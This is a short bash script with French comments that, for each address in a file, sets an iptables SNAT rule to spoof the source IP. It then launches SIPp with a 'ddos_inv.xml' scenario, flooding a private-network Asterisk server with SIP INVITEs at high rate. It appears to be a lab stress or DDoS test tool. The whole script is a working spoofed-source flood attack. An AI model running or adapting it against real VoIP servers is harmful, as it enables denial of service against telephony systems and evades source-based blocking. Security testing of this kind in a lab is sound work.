 #!/bin/bash

IP_SRC="172.27.223.90"
IP_ASTERISC="172.27.223.100"
# Fichier contenant les adresses IP à utiliser pour le spoofing
spoofed_ip_file="spoofed_ips.txt"

# Scénario SIPp à utiliser
sipp_scenario="ddos_inv.xml"

# Boucle sur chaque adresse IP du fichier
while IFS= read -r spoofed_ip
do
    echo $spoofed_ip
    # Appliquer la règle iptables pour changer l'IP source
    sudo iptables -t nat -A POSTROUTING -s $IP_SRC -j SNAT --to-source $spoofed_ip

    # Lancer SIPp avec le serveur de destination (ex. 192.168.1.20)
    sipp -sf $sipp_scenario $IP_ASTERISC:5060 -r 2000 -s 1001 -inf IP.csv &
    sleep 1 && kill $!
    
    # Optionnel : supprimer la règle iptables après chaque utilisation
    # sudo iptables -t nat -D POSTROUTING -s $IP_SRC -j SNAT --to-source $spoofed_ip
    sudo iptables -t nat -F
    # Délai entre les tests pour éviter les conflits de configuration
    # sleep 1
done < "$spoofed_ip_file"
